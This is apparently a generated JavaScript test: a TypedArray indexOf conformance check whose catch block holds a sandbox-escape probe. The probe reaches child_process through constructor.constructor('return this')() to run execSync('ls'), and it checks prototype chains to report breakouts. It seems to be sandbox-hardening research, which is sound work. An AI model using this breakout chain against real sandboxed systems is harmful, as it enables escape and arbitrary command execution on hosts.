try {
    testWithTypedArrayConstructors(function (TA) {
        var sample;
        sample = new TA([
            42,
            43,
            42,
            41
        ]);
        assert.sameValue(sample.indexOf(44), -1, 'indexOf(44)');
        assert.sameValue(sample.indexOf(43, 2), -1, 'indexOf(43, 2)');
        assert.sameValue(sample.indexOf(42, 3), -1, 'indexOf(42, 3)');
        assert.sameValue(sample.indexOf(44, -4), -1, 'indexOf(44, -4)');
        assert.sameValue(sample.indexOf(44, -5), -1, 'indexOf(44, -5)');
        assert.sameValue(sample.indexOf(42, -1), -1, 'indexOf(42, -1)');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}